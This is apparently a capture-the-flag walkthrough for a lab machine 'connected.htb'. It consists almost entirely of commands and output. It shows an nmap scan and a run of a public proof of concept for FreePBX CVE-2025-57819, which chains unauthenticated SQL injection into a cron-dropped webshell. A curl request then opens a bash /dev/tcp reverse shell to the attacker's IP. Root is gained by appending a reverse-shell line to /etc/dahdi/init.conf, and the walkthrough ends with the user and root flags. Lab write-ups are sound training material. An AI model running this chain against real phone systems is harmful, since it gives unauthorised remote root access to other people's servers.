# Discovery
```
# Nmap 7.993 scan initiated Sun Nov 22 21:35:56 2026 as: nmap -p- --open -T4 -oN nmap.txt 10.129.215.215
Nmap scan report for 10.129.215.215
Host is up (0.067s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

# Nmap done at Sun Nov 22 21:38:15 2026 -- 1 IP address (1 host up) scanned in 138.65 seconds
```

# Initial Foothold
```
(.venv) wis3man% python3 CVE-2025-57819.py connected.htb 10.10.15.134 4444                       main


       u.        ..                             u.    u.    .d``            u.    u.
 ...ue888b     .@88i         .         u      x@88k u@88c.  @8Ne.   .u    x@88k u@88c.      uL
 888R Y888r   ""%888>   .udR88N     us888u.  ^"8888""8888"  %8888:u@88N  ^"8888""8888"  .ue888Nc..
 888R I888>     '88%   <888'888k .@88 "8888"   8888  888R    `888I  888.   8888  888R  d88E`"888E`
 888R I888>   ..dILr~` 9888 'Y"  9888  9888    8888  888R     888I  888I   8888  888R  888E  888E
 888R I888>  '".-%88b  9888      9888  9888    8888  888R     888I  888I   8888  888R  888E  888E
u8888cJ888    @  '888k 9888      9888  9888    8888  888R   uW888L  888'   8888  888R  888E  888E
 "*888*P"    8F   8888 ?8888u../ 9888  9888   "*88*" 8888" '*88888Nu88P   "*88*" 8888" 888& .888E
   'Y"      '8    8888  "8888P'  "888*""888"    ""   'Y"   ~ '88888F`       ""   'Y"   *888" 888&
            '8    888F    "P'     ^Y"   ^Y'                   888 ^                     `"   "888E
             %k  <88F                                         *8E                      .dWi   `88E
              "+:*%`                                          '8>                      4888~  J8%
                                                               "                        ^"===*"`

ozcanpng security researcher
CVE-2025-57819 PoC
https://github.com/ozcanpng



FreePBX CVE-2025-57819 - Full Chain PoC
Unauthenticated SQLi -> RCE -> Root Shell

  Target : https://connected.htb
  LHOST  : 10.10.15.134:4444
  Shell  : /shell.php
  Author : ozcanpng
  GitHub : https://github.com/ozcanpng

[*] Checking target...
[+] Target is reachable

------------------------------------------------------------
[STEP] Verifying Unauthenticated SQLi
[+] SQLi confirmed.
[+] Database : asterisk
[+] Version  : 5.5.65-MariaDB
[+] DB User  : freepbxuser@localhost

------------------------------------------------------------
[STEP] Inserting Cron Job to Drop Webshell
[+] Cron job inserted successfully
[*] Waiting up to 90s for cron to execute...
[*] Webshell will be at: https://connected.htb/shell.php

------------------------------------------------------------
[STEP] Waiting for Webshell to be Deployed
[*] Attempt 1: Not ready yet... (89s remaining)
[*] Attempt 2: Not ready yet... (84s remaining)
[*] Attempt 3: Not ready yet... (78s remaining)
[*] Attempt 4: Not ready yet... (73s remaining)
[*] Attempt 5: Not ready yet... (67s remaining)
[*] Attempt 6: Not ready yet... (62s remaining)
[*] Attempt 7: Not ready yet... (57s remaining)
[*] Attempt 8: Not ready yet... (51s remaining)
[*] Attempt 9: Not ready yet... (45s remaining)
[*] Attempt 10: Not ready yet... (40s remaining)
[*] Attempt 11: Not ready yet... (35s remaining)
[*] Attempt 12: Not ready yet... (29s remaining)
[*] Attempt 13: Not ready yet... (24s remaining)
[*] Attempt 14: Not ready yet... (18s remaining)
[*] Attempt 15: Not ready yet... (13s remaining)
[*] Attempt 16: Not ready yet... (8s remaining)
[*] Attempt 17: Not ready yet... (2s remaining)
[-] Timed out waiting for webshell
[-] Webshell not found. Try manually:
  curl -k https://connected.htb/shell.php?cmd=id
```

## Opening Reverse Shell
```
curl -k 'https://connected.htb/shell.php?cmd=bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E15%2E134%2F4444%200%3E%261'
```

# Found user.txt
```
[asterisk@connected html]$ cd
bash: cd: HOME not set
[asterisk@connected html]$ cd /home/
[asterisk@connected home]$ ls
asterisk
[asterisk@connected home]$ cd asterisk/
[asterisk@connected asterisk]$ ls
user.txt
[asterisk@connected asterisk]$ cat user.txt
3259bad5f4ae0c6ac464b8586323f100
```

# PVE to `root`
```
[asterisk@connected asterisk]$ printf '\nbash -i >& /dev/tcp/10.10.15.134/6666 0>&1\n' >> /etc/dahdi/init.conf
```
```
[asterisk@connected asterisk]$ printf '\nbash -i >& /dev/tcp/10.10.15.134/6666 0>&1\n' >> /etc/dahdi/init.conf
```

# Found root.txt
```
[root@connected /]# cd /root
[root@connected root]# ls
root.txt
[root@connected root]# cat root.txt
ed3a2225b40e9afa95a0136540b2d73a
```
